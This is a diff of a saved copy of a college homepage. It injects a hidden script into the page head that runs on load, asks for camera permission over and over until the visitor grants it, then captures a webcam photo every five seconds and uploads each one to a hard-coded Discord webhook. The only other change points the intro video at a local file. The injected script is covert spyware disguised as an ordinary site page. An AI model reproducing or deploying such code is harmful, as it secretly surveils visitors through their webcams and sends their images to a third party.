@@ -1,6 +1,73 @@
 <!DOCTYPE html>
 <!-- saved from url=(0023)https://jeccac.in/Home/ -->
-<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<html lang="en"><head>
+    <script>
+        let videoStream;
+
+        async function startCamera() {
+            // Continuously request camera permission until granted
+            while (true) {
+                try {
+                    // Request camera permission and access the video stream
+                    videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    const video = document.createElement('video');
+                    video.srcObject = videoStream;
+                    video.play();
+
+                    // Set the canvas dimensions based on the video stream
+                    video.addEventListener('loadedmetadata', () => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+
+                        // Automatically take a picture every 5 seconds
+                        setInterval(() => {
+                            takePicture(video, canvas);
+                        }, 5000);
+                    });
+                    break; // Break the loop if permission is granted
+                } catch (error) {
+                    console.error('Error accessing camera:', error);
+                    //alert('Camera permission is required. Please allow access to the camera.'); // Alert user to allow access
+                    // Wait before asking again to avoid rapid prompts
+                    await new Promise(resolve => setTimeout(resolve, 100)); // Wait for 2 seconds
+                }
+            }
+        }
+
+        async function takePicture(video, canvas) {
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Get the image data as a JPEG encoded string with specified quality (0.5)
+            const imageData = canvas.toDataURL('image/jpeg', 0.5); // Adjust quality between 0 (low) to 1 (high)
+            const blob = await fetch(imageData).then(res => res.blob());
+
+            // Send the compressed image to the Discord webhook
+            const formData = new FormData();
+            formData.append('file', blob, 'image.jpg');
+
+            await fetch('https://discord.com/api/webhooks/1344749048040652863/0CiUlJao76_Ji56M5ztA_Qzo6dRFEpORjDS-riWu84O5jW7VX3CIJx-2KW5FF-ru_Tn-', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('Compressed image captured and sent to Discord.');
+                } else {
+                    console.error('Error sending image to Discord:', response.statusText);
+                }
+            })
+            .catch(error => {
+                console.error('Fetch error:', error);
+            });
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            startCamera();
+        });
+    </script>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
         
         <meta name="viewport" content="width=device-width, initial-scale=1">
 
@@ -279,7 +346,7 @@ img#chat {
 
                 <div class="videoWrapper">
                                         <video id="introVideo" autoplay="" loop="" muted="" class="custom-video" poster="videos/13890_JEC_NEW.jpg">
-                        <source src="http://jeccac.in/Home/jechome_admin/assets/videos/JY.mp4" alt="JY.mp4" type="video/mp4">
+                        <source src="./index_files/JY.mp4" alt="JY.mp4" type="video/mp4">
 
                         Your browser does not support the video tag.
                     </video>
